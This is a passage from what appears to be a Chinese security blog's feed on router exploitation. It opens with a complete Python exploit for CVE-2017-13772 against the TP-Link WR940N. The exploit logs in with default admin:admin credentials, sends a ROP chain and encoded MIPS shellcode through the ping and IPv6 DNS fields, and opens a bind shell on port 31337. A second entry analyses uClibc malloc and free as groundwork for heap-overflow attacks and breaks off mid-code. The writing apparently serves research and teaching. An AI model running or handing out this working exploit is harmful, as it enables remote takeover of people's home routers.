class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">import urllib2</div><div class="line">import base64</div><div class="line">import hashlib</div><div class="line">from optparse import *</div><div class="line">import sys</div><div class="line">import urllib</div><div class="line"></div><div class="line">banner = (</div><div class="line">&quot;___________________________________________________________________________\n&quot;</div><div class="line">&quot;WR940N Authenticated Remote Code Exploit\n&quot;</div><div class="line">&quot;This exploit will open a bind shell on the remote target\n&quot;</div><div class="line">&quot;The port is 31337, you can change that in the code if you wish\n&quot;</div><div class="line">&quot;This exploit requires authentication, if you know the creds, then\n&quot;</div><div class="line">&quot;use the -u -p options, otherwise default is admin:admin\n&quot;</div><div class="line">&quot;___________________________________________________________________________&quot;</div><div class="line">)</div><div class="line"></div><div class="line">def login(ip, user, pwd):</div><div class="line">	print &quot;[+] Attempting to login to http://%s %s:%s&quot;%(ip,user,pwd)</div><div class="line">	#### Generate the auth cookie of the form b64enc(&apos;admin:&apos; + md5(&apos;admin&apos;))</div><div class="line">	hash = hashlib.md5()</div><div class="line">	hash.update(pwd)</div><div class="line">	auth_string = &quot;%s:%s&quot; %(user, hash.hexdigest())</div><div class="line">	encoded_string = base64.b64encode(auth_string)</div><div class="line"></div><div class="line">	print &quot;[+] Encoded authorisation: %s&quot; %encoded_string#### Send the request</div><div class="line">	url = &quot;http://&quot; + ip + &quot;/userRpm/LoginRpm.htm?Save=Save&quot;</div><div class="line">	print &quot;[+] sending login to &quot; + url</div><div class="line">	req = urllib2.Request(url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %encoded_string)</div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line">	#### The server generates a random path for further requests, grab that here</div><div class="line">	data = resp.read()</div><div class="line">	next_url = &quot;http://%s/%s/userRpm/&quot; %(ip, data.split(&quot;/&quot;)[3])</div><div class="line">	print &quot;[+] Got random path for next stage, url is now %s&quot; %next_url</div><div class="line">	return (next_url, encoded_string)</div><div class="line"></div><div class="line">#custom bind shell shellcode with very simple xor encoder</div><div class="line">#followed by a sleep syscall to flush cash before running</div><div class="line">#bad chars = 0x20, 0x00</div><div class="line">shellcode = (</div><div class="line">#encoder</div><div class="line">&quot;\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99&quot;</div><div class="line">&quot;\x27\xb2\x05\x4b&quot; #0x27b2059f for first_exploit</div><div class="line">&quot;\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xc1&quot;</div><div class="line"></div><div class="line">#sleep</div><div class="line">&quot;\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08&quot;</div><div class="line">&quot;\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa&quot;</div><div class="line">&quot;\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c&quot;</div><div class="line"></div><div class="line">################ encoded shellcode ###############</div><div class="line">&quot;\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06&quot;</div><div class="line">&quot;\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff&quot;</div><div class="line">&quot;\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d&quot;</div><div class="line">&quot;\x7a\x69&quot;            #&lt;————————- PORT 0x7a69 (31337)</div><div class="line">&quot;\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad&quot;</div><div class="line">&quot;\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc&quot;</div><div class="line">&quot;\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01&quot;</div><div class="line">&quot;\x01\x0c\x24\x0f\x73\x50&quot;</div><div class="line">&quot;\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f&quot;</div><div class="line">&quot;\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48&quot;</div><div class="line">&quot;\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f&quot;</div><div class="line">&quot;\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50&quot;</div><div class="line">&quot;\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f&quot;</div><div class="line">&quot;\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c&quot;</div><div class="line">&quot;\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce&quot;</div><div class="line">&quot;\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8&quot;</div><div class="line">&quot;\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02&quot;</div><div class="line">&quot;\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa&quot;</div><div class="line">&quot;\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c&quot;</div><div class="line">)</div><div class="line"></div><div class="line">###### useful gadgets #######</div><div class="line">nop = &quot;\x22\x51\x44\x44&quot;</div><div class="line">gadg_1 = &quot;\x2A\xB3\x7C\x60&quot;  # set $a0 = 1, and jmp $s1</div><div class="line">gadg_2 = &quot;\x2A\xB1\x78\x40&quot;</div><div class="line">sleep_addr = &quot;\x2a\xb3\x50\x90&quot;</div><div class="line">stack_gadg = &quot;\x2A\xAF\x84\xC0&quot;</div><div class="line">call_code = &quot;\x2A\xB2\xDC\xF0&quot;</div><div class="line"></div><div class="line">def first_exploit(url, auth):</div><div class="line">	#          trash $s1        $ra</div><div class="line">	rop = &quot;A&quot;*164 + gadg_2  + gadg_1 + &quot;B&quot;*0x20 + sleep_addr + &quot;C&quot;*4</div><div class="line">	rop += &quot;C&quot;*0x1c + call_code + &quot;D&quot;*4 + stack_gadg + nop*0x20 + shellcode</div><div class="line"></div><div class="line">	params = &#123;&apos;ping_addr&apos;: rop, &apos;doType&apos;: &apos;ping&apos;, &apos;isNew&apos;: &apos;new&apos;, &apos;sendNum&apos;: &apos;20&apos;, &apos;pSize&apos;: &apos;64&apos;, &apos;overTime&apos;: &apos;800&apos;, &apos;trHops&apos;: &apos;20&apos;&#125;</div><div class="line"></div><div class="line">	new_url = url + &quot;PingIframeRpm.htm?&quot; + urllib.urlencode(params)</div><div class="line"></div><div class="line">	print &quot;[+] sending exploit…&quot;</div><div class="line">	print &quot;[+] Wait a couple of seconds before connecting&quot;</div><div class="line">	print &quot;[+] When you are finished do http -r to reset the http service&quot;</div><div class="line"></div><div class="line">	req = urllib2.Request(new_url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %auth)</div><div class="line">	req.add_header(&apos;Referer&apos;, url + &quot;DiagnosticRpm.htm&quot;)</div><div class="line"></div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line"></div><div class="line">def second_exploit(url, auth):</div><div class="line">	url = url + &quot;WanStaticIpV6CfgRpm.htm?&quot;</div><div class="line">	#                 trash      s0      s1      s2       s3     s4      ret     shellcode</div><div class="line">	payload = &quot;A&quot;*111 + &quot;B&quot;*4 + gadg_2 + &quot;D&quot;*4 + &quot;E&quot;*4 + &quot;F&quot;*4 + gadg_1 + &quot;a&quot;*0x1c</div><div class="line">	payload += &quot;A&quot;*4 + sleep_addr + &quot;C&quot;*0x20 + call_code + &quot;E&quot;*4</div><div class="line">	payload += stack_gadg + &quot;A&quot;*4 +  nop*10 + shellcode + &quot;B&quot;*7</div><div class="line">	print len(payload)</div><div class="line"></div><div class="line">	params = &#123;&apos;ipv6Enable&apos;: &apos;on&apos;, &apos;wantype&apos;: &apos;2&apos;, &apos;ipType&apos;: &apos;2&apos;, &apos;mtu&apos;: &apos;1480&apos;, &apos;dnsType&apos;: &apos;1&apos;,</div><div class="line">	&apos;dnsserver2&apos;: payload, &apos;ipAssignType&apos;: &apos;0&apos;, &apos;ipStart&apos;: &apos;1000&apos;,</div><div class="line">	&apos;ipEnd&apos;: &apos;2000&apos;, &apos;time&apos;: &apos;86400&apos;, &apos;ipPrefixType&apos;: &apos;0&apos;, &apos;staticPrefix&apos;: &apos;AAAA&apos;,</div><div class="line">	&apos;staticPrefixLength&apos;: &apos;64&apos;, &apos;Save&apos;: &apos;Save&apos;, &apos;RenewIp&apos;: &apos;1&apos;&#125;</div><div class="line"></div><div class="line">	new_url = url + urllib.urlencode(params)</div><div class="line"></div><div class="line">	print &quot;[+] sending exploit…&quot;</div><div class="line">	print &quot;[+] Wait a couple of seconds before connecting&quot;</div><div class="line">	print &quot;[+] When you are finished do http -r to reset the http service&quot;</div><div class="line"></div><div class="line">	req = urllib2.Request(new_url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %auth)</div><div class="line">	req.add_header(&apos;Referer&apos;, url + &quot;WanStaticIpV6CfgRpm.htm&quot;)</div><div class="line"></div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">	print banner</div><div class="line">	username = &quot;admin&quot;</div><div class="line">	password = &quot;admin&quot;</div><div class="line"></div><div class="line">	(next_url, encoded_string) = login(&quot;192.168.0.1&quot;, username, password)</div><div class="line"></div><div class="line">	###### Both exploits result in the same bind shell ######</div><div class="line">	#first_exploit(data[0], data[1])</div><div class="line">	first_exploit(next_url, encoded_string)</div></pre></td></tr></table></figure>
<p>参考链接：</p>
<p><a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-13772 </tag>
            
            <tag> 路由器实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之uClibc中malloc&&free分析]]></title>
      <url>/2017/10/28/step_by_step_pwn_router_part6.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>栈溢出告一段落。本文介绍下 <code>uClibc</code> 中的 <code>malloc</code> 和 <code>free</code> 实现。为堆溢出的利用准备基础。<code>uClibc</code> 是 <code>glibc</code> 的一个精简版，主要用于嵌入式设备，比如路由器就基本使用的是 <code>uClibc</code>， 简单自然效率高。所以他和一般的<code>x86</code>的堆分配机制会有些不一样。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>uClibc 的 <code>malloc</code> 有三种实现，分别为：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509164969446w1f222m1.png?imageslim" alt="paste image"><br>其中 <code>malloc-standard</code> 是最近更新的。它就是把 <code>glibc</code> 的 <code>dlmalloc</code> 移植到了 <code>uClibc</code>中。<code>malloc</code> 是<code>uClibc</code>最开始版本用的 <code>malloc</code>。本文分析的也是<code>malloc</code>目录下的<code>uClibc</code>自己最初实现的 <code>malloc</code>。 因为如果是 <code>malloc-standard</code> 我们可以直接按照 一般 <code>linux</code> 中的堆漏洞相关的利用技巧来利用它。</p>
<p>现在编译 <code>uClibc</code> 的话默认使用的是  <code>malloc-standard</code> ，我也不知道该怎么切换，所以就纯静态看看 <code>malloc</code>目录下的实现了。</p>
<h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>从 <code>malloc</code> 的入口开始分析。 为了简单起见删掉了无关代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">//malloc 返回一个指定大小为 __size 的指针。</div><div class="line"></div><div class="line">/*</div><div class="line">调用 malloc 申请空间时，先检查该链表中是否有满足条件的空闲区域节点</div><div class="line">如果没有，则向内核申请内存空间，放入这个链表中，然后再重新在链表中</div><div class="line">查找一次满足条件的空闲区域节点。</div><div class="line"></div><div class="line">它实际上是调用 malloc_from_heap 从空闲区域中申请空间。</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line">void *</div><div class="line">malloc (size_t size)</div><div class="line">&#123;</div><div class="line">  void *mem;</div><div class="line"></div><div class="line"></div><div class="line">  //参数有效性检测。这里没有检测参数为负的情况</div><div class="line"></div><div class="line">  if (unlikely (size == 0))</div><div class="line">    goto oom;</div><div class="line"></div><div class="line"></div><div class="line">  mem = malloc_from_heap (size, &amp;__malloc_heap, &amp;__malloc_heap_lock);</div><div class="line"></div><div class="line">  return mem;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>malloc</code> 实际使用的是 <code>malloc_from_heap</code> 来分配内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">static void *</div><div class="line">__malloc_from_heap (size_t size, struct heap_free_area **heap</div><div class="line">		)</div><div class="line">&#123;</div><div class="line">  void *mem</div><div class="line"></div><div class="line">  /* 一个 malloc 块的结构如下：</div><div class="line">  </div><div class="line">	  +--------+---------+-------------------+</div><div class="line">	  | SIZE   |(unused) | allocation  ...   |</div><div class="line">	  +--------+---------+-------------------+</div><div class="line">	  ^ BASE			 ^ ADDR</div><div class="line">	  ^ ADDR - MALLOC_ALIGN</div><div class="line">  </div><div class="line">	  申请成功后返回的地址是 ADDR</div><div class="line">	  SIZE 表示块的大小，包括前面的那部分，也就是 MALLOC_HEADER_SIZE</div><div class="line">   */</div><div class="line">  </div><div class="line">  //实际要分配的大小，叫上 header的大小</div><div class="line">  size += MALLOC_HEADER_SIZE;</div><div class="line"></div><div class="line">//加锁</div><div class="line">  __heap_lock (heap_lock);</div><div class="line"></div><div class="line">  /* First try to get memory that&apos;s already in our heap.  */</div><div class="line">  //首先尝试从heap分配内存.这函数见前面的分析</div><div class="line">  mem = __heap_alloc (heap, &amp;size);</div><div class="line"></div><div class="line">  __heap_unlock (heap_lock);</div><div class="line">  </div><div class="line">  /*</div><div class="line">  后面是分配失败的流程，会调用系统调用从操作系统分配内存到 heap, 然后再调用__heap_alloc，进行分配，本文不在分析。</div><div class="line">  */</div></pre></td></tr></table></figure>
<p>计算需要分配内存块的真实大小后进入  <code>__heap_alloc</code> 分配。</p>
<p>在 <code>heap</code>中使用 <code>heap_free_area</code> 来管理空闲内存，它定义在 <code>heap.h</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*</div><div class="line"></div><div class="line"></div><div class="line">struct heap_free_area</div><div class="line">&#123;</div><div class="line">	size_t size;  //空闲区的大小</div><div class="line">	 //用于构造循环链表</div><div class="line">	struct heap_free_area *next, *prev;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">size 表示该空闲区域的大小，这个空闲区域的实际地址并没有用指针详细地指明，</div><div class="line">因为它就位于当前 heap_free_area 节点的前面，如下图所示：</div><div class="line"></div><div class="line">+-------------------------------+--------------------+</div><div class="line">|                               |   heap_free_area   |</div><div class="line">+-------------------------------+--------------------+</div><div class="line">\___________ 空闲空间 ___________/\___ 空闲空间信息 ___/</div><div class="line"></div><div class="line"></div><div class="line">实际可用的空闲空间大小为 size – sizeof(struct heap_free_area)</div><div class="line"></div><div class="line">指针 next, prev 分别指向下一个和上一个空间区域，</div><div class="line">所有的空闲区域就是通过许许多多这样的节点链起来的，</div><div class="line">很显然，这样组成的是一个双向链表。</div><div class="line"></div><div class="line">*/</div></pre></td></tr></table></figure></p>
<p>所以 <code>free</code> 块在内存中的存储方式和 <code>glibc</code> 中的存储方式是不一样的。它的元数据在块的末尾，而 <code>glibc</code>中元数据在 块的开头。</p>
<p>下面继续分析 <code>__heap_alloc</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* </div><div class="line">   堆heap中分配size字节的内存</div><div class="line">   */</div><div class="line">void *</div><div class="line">__heap_alloc (struct heap_free_area **heap, size_t *size)</div><div class="line">&#123;</div><div class="line">  struct heap_free_area *fa;</div><div class="line">  size_t _size = *size;</div><div class="line">  void *mem = 0;</div><div class="line"></div><div class="line">  /* 根据 HEAP_GRANULARITY 大小向上取整，在 heap.h 中定义 */</div><div class="line"></div><div class="line">  _size = HEAP_ADJUST_SIZE (_size);</div><div class="line">  //如果要分配的内存比FA结构还要小，那就调整它为FA大小</div><div class="line">  </div><div class="line"></div><div class="line">  if (_size &lt; sizeof (struct heap_free_area))</div><div class="line">   </div><div class="line"></div><div class="line"> //根据HEAP_GRANULARITY 对齐 sizeof(double)</div><div class="line">    _size = HEAP_ADJUST_SIZE (sizeof (struct heap_free_area));</div><div class="line"></div><div class="line">	//遍历堆中的FA，找出有合适大小的空闲区,在空闲区域链表中查找大小大于等于 _SIZE 的节点 </div><div class="line">  for (fa = *heap; fa; fa = fa-&gt;next)</div><div class="line">    if (fa-&gt;size &gt;= _size)</div><div class="line">      &#123;</div><div class="line">		/* Found one!  */</div><div class="line">		mem = HEAP_FREE_AREA_START (fa);</div><div class="line">		 //从该空间中分得内存。这函数前面已经分析过了</div><div class="line">		*size = __heap_free_area_alloc (heap, fa, _size);</div><div class="line">		break;</div><div class="line">      &#125;</div><div class="line">  return mem;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>找到<code>大小 &gt;= 请求size</code> 的 <code>heap_free_area</code>，然后进入 <code>__heap_free_area_alloc 分配</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line">   该函数从fa所表示的heap_free_area中，分配size大小的内存</div><div class="line">   */</div><div class="line">static __inline__ size_t</div><div class="line">__heap_free_area_alloc (struct heap_free_area **heap,</div><div class="line">			struct heap_free_area *fa, size_t size)</div><div class="line">&#123;</div><div class="line">  size_t fa_size = fa-&gt;size;</div><div class="line"></div><div class="line">  //如果该空闲区剩余的内存太少。将它全部都分配出去</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">  if (fa_size &lt; size + HEAP_MIN_FREE_AREA_SIZE)</div><div class="line">    &#123;</div><div class="line">    ////将fa从heap中删除</div><div class="line">      __heap_delete (heap, fa);</div><div class="line">      /* Remember that we&apos;ve alloced the whole area.  */</div><div class="line">      size = fa_size;</div><div class="line">    &#125;</div><div class="line">  else</div><div class="line">	  /* 如果这个区域中还有空闲空间，就把 heap_free_area 节点中</div><div class="line">		   的 size 减小 size就可以了：</div><div class="line">	  </div><div class="line">		   分配前：</div><div class="line">		 __________ 空闲空间 __________ 	__ 空闲空间信息 __</div><div class="line">		/							   \ /					\</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		|								|	heap_free_area	 |</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		\__________ fa-&gt;size __________/</div><div class="line">	  </div><div class="line">		   分配后：</div><div class="line">			 ___ 已分配 __	  __ 空闲空间 __   __ 空闲空间信息 __</div><div class="line">		/			  \ /			   \ /					\</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		|			   |				|	heap_free_area	 |</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		\____ size ___/ \__ fa-&gt;size __/</div><div class="line">	  </div><div class="line">		*/</div><div class="line"></div><div class="line">    fa-&gt;size = fa_size - size;</div><div class="line"></div><div class="line">  return size;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>注释很清晰了。所以如果我们有一个堆溢出，我们就需要覆盖到下面空闲空间的 <code>heap_free_area</code> 中的 指针，才能实现 <code>uClibc</code> 中的 <code>unlink</code> 攻击（当然还要其他条件的配合）,另外我们也知道了在 <code>malloc</code> 的时候，找到合适的 <code>heap_free_area</code>  后，只需要修改 <code>heap_free_area</code> 的 size位就可以实现了分配，所以在 <code>malloc</code> 中是无法 触发类似 <code>unlink</code> 的攻击的。</p>
<p>下面进入 <code>free</code></p>
<h4 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h4><p>首先看 free 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">free (void *mem)</div><div class="line">&#123;</div><div class="line">  free_to_heap (mem, &amp;__malloc_heap, &amp;__malloc_heap_lock);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>直接调用了 <code>free_to_heap</code> 函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">static void</div><div class="line">__free_to_heap (void *mem, struct heap_free_area **heap)</div><div class="line">&#123;</div><div class="line">  size_t size;</div><div class="line">  struct heap_free_area *fa;</div><div class="line">   /* 检查 mem 是否合法 */</div><div class="line">  if (unlikely (! mem))</div><div class="line">    return;</div><div class="line">/* 获取 mem 指向的 malloc 块的的实际大小和起始地址 */</div><div class="line">  size = MALLOC_SIZE (mem); //获取块的真实大小</div><div class="line">  mem = MALLOC_BASE (mem); //获取块的基地址</div><div class="line">  __heap_lock (heap_lock); //加锁</div><div class="line">  /* 把 mem 指向的空间放到 heap 中  */</div><div class="line">  fa = __heap_free (heap, mem, size);</div><div class="line"></div><div class="line"> //如果FA中的空闲区超过  MALLOC_UNMAP_THRESHOLD。就要进行内存回收了,涉及 brk, 看不懂，就不说了，感觉和利用也没啥关系。</div></pre></td></tr></table></figure>
<p>首先获得了 内存块的起始地址和大小，然后调用 <code>__heap_free</code> 把要 <code>free</code> 的内存放到 <code>heap</code> 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*</div><div class="line">语义上的理解是释放掉从mem开始的size大小的内存。换句话说，就是把从从mem开始的，size大小的内存段，映射回heap。</div><div class="line">*/</div><div class="line">struct heap_free_area *</div><div class="line">__heap_free (struct heap_free_area **heap, void *mem, size_t size)</div><div class="line">&#123;</div><div class="line">  struct heap_free_area *fa, *prev_fa;</div><div class="line">  </div><div class="line">  //拿到 mem的 结束地址</div><div class="line">  void *end = (char *)mem + size;</div><div class="line"></div><div class="line"></div><div class="line">  /* 空闲区域链表是按照地址从小到大排列的，这个循环是为了找到 mem 应该插入的位置 */</div><div class="line">  for (prev_fa = 0, fa = *heap; fa; prev_fa = fa, fa = fa-&gt;next)</div><div class="line">    if (unlikely (HEAP_FREE_AREA_END (fa) &gt;= 